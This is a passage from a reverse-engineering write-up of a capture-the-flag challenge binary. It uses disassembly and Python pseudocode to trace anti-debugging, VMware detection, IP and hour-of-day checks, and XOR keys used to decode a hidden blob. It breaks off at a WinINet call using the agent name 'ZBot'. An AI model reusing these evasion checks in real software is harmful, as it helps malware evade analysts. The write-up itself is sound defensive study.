<p>The xor-string is <code>SHOPPING IS HARD</code> if the resolved IP address is not <code>127.0.0.1</code>. If the IP address is <code>127.0.0.1</code> or <code>h_addrtype</code> is not <code>2</code> then <code>LETS GO MATH</code> will be xor-ed with the blob.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Dogecoin.com IP check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">h_addrtype</span> <span class="o">!=</span> <span class="mi">2</span> <span class="ow">or</span> <span class="p">(</span><span class="n">Dogecoin_ip</span> <span class="o">==</span> <span class="s">&quot;127.0.0.1&quot;</span><span class="p">)):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;LETS GO MATH&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">Dogecoin_ip</span> <span class="o">!=</span> <span class="s">&quot;127.0.0.1&quot;</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;SHOPPING IS HARD&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-11---hour-of-the-wolf">Function 11 - Hour of the Wolf</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">IPCheck</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>   <span class="c1">; you are here</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-18.jpg" alt="Hour check" title="Hour check" /></p>

<p>Again, we see the familiar <code>time64</code> and <code>localtime64</code> calls. This time offset 8 of the <code>tm</code> structure (copied below) is compared with <code>0x11</code> or <code>17</code>. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>tm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="c1">// each field is an int (4 bytes)</span>
</span><span class="line">
</span><span class="line"><span class="nl">tm_sec:</span>     <span class="n">Seconds</span> <span class="n">after</span> <span class="n">minute</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">).</span>  <span class="p">;</span> <span class="nl">index:</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">tm_min:</span>     <span class="n">Minutes</span> <span class="n">after</span> <span class="n">hour</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">).</span>    <span class="p">;</span> <span class="nl">index:</span> <span class="mi">4</span>
</span><span class="line"><span class="nl">tm_hour:</span>    <span class="n">Hours</span> <span class="n">after</span> <span class="n">midnight</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">23</span><span class="p">).</span>  <span class="p">;</span> <span class="nl">index:</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">tm_mday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">month</span> <span class="p">(</span><span class="mi">1</span> <span class="err">–</span> <span class="mi">31</span><span class="p">).</span>
</span><span class="line"><span class="nl">tm_mon:</span>     <span class="n">Month</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">11</span><span class="p">;</span> <span class="n">January</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
</span><span class="line"><span class="nl">tm_year:</span>    <span class="n">Year</span> <span class="p">(</span><span class="n">current</span> <span class="n">year</span> <span class="n">minus</span> <span class="mi">1900</span><span class="p">).</span>
</span><span class="line"><span class="nl">tm_wday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">week</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">6</span><span class="p">;</span> <span class="n">Sunday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
</span><span class="line"><span class="nl">tm_yday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">year</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">365</span><span class="p">;</span> <span class="n">January</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
</span><span class="line"><span class="nl">tm_isdst:</span>   <span class="n">Positive</span> <span class="n">value</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">not</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="n">negative</span> <span class="n">value</span> <span class="k">if</span> <span class="n">status</span> <span class="n">of</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">unknown</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>If time check passes, blob is xor-ed with <code>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</code> otherwise it will be xor-ed with <code>\x07\x77</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Hour check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">Hour</span> <span class="o">==</span> <span class="mi">17</span><span class="p">)):</span>   <span class="c"># Between 5 and 6 PM</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x07\x77</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="interlude---12---fullpath-xor">Interlude - 12 - Fullpath xor</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">IPCheck</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">HourCheck</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B4C</span> <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span> <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B52</span> <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B54</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B56</span> <span class="nv">test</span>    <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B58</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_401B83</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B5A</span> <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span> <span class="nv">loc_401B60</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B81j</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0AAAAAAABh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B65</span> <span class="nv">mul</span>     <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B67</span> <span class="nv">shr</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">3</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6A</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6D</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6F</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B71</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B73</span> <span class="nv">sub</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B75</span> <span class="nv">mov</span>     <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="nb">edi</span><span class="p">]</span>    <span class="c1">; Moving full path to al by character</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B78</span> <span class="nv">xor</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">al</span>    <span class="c1">; xor-ing full path with blob</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B7E</span> <span class="nv">inc</span>     <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B7F</span> <span class="nv">cmp</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B81</span> <span class="nv">jb</span>      <span class="nv">short</span> <span class="nv">loc_401B60</span> <span class="c1">; jump back up to xor the next char</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc_401B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">sub_4017A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub_4018A0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, <strong>keep in mind that one of the checks compared full path with <code>backdoge.exe</code></strong>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Fullpath xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-13---internet-rootz">Function 13 - Internet Rootz</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc_401B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">sub_4017A0</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub_4018A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Two more functions. We’re getting there.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-19.jpg" alt="Fetching IP for e.root-servers.net" title="Fetching IP for e.root-servers.net" /></p>

<p>We have seen this type of code. This function pushes <code>e.root-servers.net</code> to stack and then calls <code>gethostbyname</code> to retrieve its IP <code>192.203.230.10</code>. If the result is not zero, <code>h_addrtype</code> is checked for 2 (<code>AF_INET</code>) and retrieved IP is converted into ASCII format.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-20.jpg" alt="xor-ing IP with blob" title="xor-ing IP with blob" /></p>

<p>The rest is pretty simple. <code>192.203.230.10</code> is xor-ed with the blob.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Fullpath xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;192.203.230.10&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-14---jackrat">Function 14 - jackRAT</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc_401B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">InternetRootz</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub_4018A0</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>sub_4018A0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A0</span> <span class="nv">sub_4018A0</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A0</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A3</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">1088h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A8</span> <span class="nv">call</span>    <span class="nv">__alloca_probe</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">AD</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nv">___security_cookie</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B2</span> <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B4</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B7</span> <span class="nv">push</span>    <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B8</span> <span class="nv">xor</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BA</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwFlags - 0x00</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszProxyBypass - 0x00</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszProxy - 0x00</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BD</span> <span class="nv">push</span>    <span class="mi">1</span>               <span class="c1">; dwAccessType - INTERNET_OPEN_TYPE_DIRECT</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BD</span>                         <span class="c1">; Meaning direct access</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BF</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">szAgent</span>  <span class="c1">; &quot;ZBot&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">C4</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenW</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">CA</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_1088</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D0</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>          <span class="c1">; If a NULL handle is returned (no internet connectivity) exit</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D2</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_4018E5</span>  <span class="c1">; otherwise jump to loc_4018E5</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D4</span> <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D6</span> <span class="nv">pop</span>     <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D7</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">DA</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">DC</span> <span class="nv">call</span>    <span class="err">@</span><span class="nv">__security_check_cookie@4</span> <span class="c1">; __security_check_cookie(x)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E1</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E3</span> <span class="nv">pop</span>     <span class="nb">ebp</span>             <span class="c1">; exit if NULL handle was retured</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E4</span> <span class="nv">ret</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We see <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx">InternetOpen</a> called. This function initialises the WinINet functions. Agent name is <code>ZBot</code> which is an alternate name for the <code>Zeus</code> trojan horse. Access type is <code>INTERNET_OPEN_TYPE_DIRECT</code> which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to <code>loc_4018E5</code> (line 21).</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc 4018E5 - InternetOpenUrl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">loc_4018E5</span><span class="p">:</span>             <span class="c1">; dwContext</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">push</span>    <span class="nb">ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E6</span> <span class="nv">push</span>    <span class="mh">400100h</span>         <span class="c1">; dwFlags</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwHeadersLength - 0x00</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszHeaders - 0x00</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">ED</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F0</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpszUrl</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hInternet - Handle from previous InternetOpen</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F2</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">],</span> <span class="mh">740068h</span>
